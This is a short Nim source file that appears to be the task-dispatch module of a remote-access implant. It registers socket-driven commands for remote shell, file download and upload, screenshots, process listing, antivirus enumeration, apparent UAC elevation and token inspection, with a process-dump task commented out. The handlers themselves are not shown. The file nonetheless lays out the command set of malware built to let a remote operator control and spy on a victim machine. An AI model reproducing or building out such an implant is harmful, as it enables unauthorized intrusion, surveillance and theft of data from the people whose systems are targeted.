import net

import download, msgbox, processes, screenshot, shell, tokinfo, upload, antiviruses, uac_elv, dotnet_info

var tasks*: seq[tuple[
  name: string, 
  execute: proc(socket: Socket, taskId: int, params: seq[string]) {.nimcall.}
]] = @[]

tasks.add((name: "download", execute: download.executeTask))
tasks.add((name: "msgbox", execute: msgbox.executeTask))
tasks.add((name: "processes", execute: processes.executeTask))
tasks.add((name: "screenshot", execute: screenshot.executeTask))
tasks.add((name: "shell", execute: shell.executeTask))
tasks.add((name: "tokinfo", execute: tokinfo.executeTask))
tasks.add((name: "upload", execute: upload.executeTask))
tasks.add((name: "antiviruses", execute: antiviruses.executeTask))
tasks.add((name: "uac_elv", execute: uac_elv.executeTask))
tasks.add((name: "dotnet_info", execute: dotnet_info.executeTask))
# tasks.add((name: "dumpprocess", execute: dumpprocess.executeTask))